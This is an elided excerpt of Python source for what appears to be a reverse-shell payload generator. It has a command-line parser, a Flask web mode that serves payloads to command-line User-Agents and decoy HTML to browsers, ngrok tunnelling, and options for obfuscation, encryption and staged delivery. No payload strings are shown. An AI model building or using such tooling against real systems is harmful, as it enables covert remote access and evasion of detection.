...
def create_app(host="127.0.0.1", port=80, debug=False, template='', authtoken='', notunnel=False, html=''):
    try:
    ...
    if template != 1:
        ...
        if os.path.isdir(template):
            print("   Web Dir:", os.path.abspath(template))
    else:
    ...
    def gen():
        ...
        if localtunnel == "ng_close" and not notunnel:
            try:
                ngrok.kill(ngrok_conf)
        ...
        if not platform:
            platform = "linux"
        payload = Generator(host=_host, port=_port, shell_type=shell_type, direction=direction, protocol=protocol,
                            encryption=encryption, encoder=encoder, web=True, password=password, platform=platform,
                            binary_name=binary_name, shell_path=shell_path, obfuscator=obfuscator,
                            ip_obfuscator=ip_obfuscator, staging_url=staging_url, staging_cmd=staging_cmd,
                            localtunnel=localtunnel, authtoken=authtoken, notunnel=notunnel)
        title = None
        try:
        ...
        if any(x in request.headers["User-Agent"].lower() for x in ua):
            ...
            if template != 1:
                if os.path.exists(template):
                    if os.path.isdir(template):
                        _html = send_from_directory(os.path.abspath(template), 'index.html')
                    else:
                        _html = send_file(os.path.abspath(template))
            else:
                _html = html
...
class Utils:
    ...
    def print_banner(self):
        color_str = ['1;32m', '1;33m', '1;35m', '1;36m']
        banner = random.choice(__BANNERS__).format(self.bright_white(__Version__), self.bright_white(__SITE__))
        for i, line in enumerate(banner.splitlines()):
            print('\033[{0}{1}\033[0m'.format(random.choice(color_str) if i in [random.randint(1, 9)]
                                              else random.choice(color_str), line))
...
def cmdLineParser():
    ...
    parser.add_argument("-t", '--type', default='bash', type=str, metavar='',
                        help="Shell type." + str(shell_types))
    ...
    parser.add_argument("--tunnel", metavar='', default='',
                        choices=['ngrok_us', 'ngrok_au', 'ngrok_eu', 'ngrok_ap', 'ngrok_sa', 'ngrok_jp',
                                 'ngrok_in'], help="Enable tunnel.Example: --tunnel ngrok_jp")
    ...
    webGroup.add_argument('--notunnel', default=False, action="store_true", help="Disable tunnel.[Default:False]")
...
def main():
    ...
    if args.web:
        ...
        payload = Generator(host=args.lhost, port=args.lport, shell_type=args.type, direction=args.direction,
                            ...
                            platform=args.platform, shell_path=args.shell_path, ip_obfuscator=args.ip_obf,
                            obfuscator=args.obf, staging_url=args.staging_url, staging_cmd=args.staging_cmd,
                            localtunnel=args.tunnel, authtoken=args.authtoken, web=args.web, output=args.output,
        ...
        if args.tunnel and not args.notunnel:
            try:
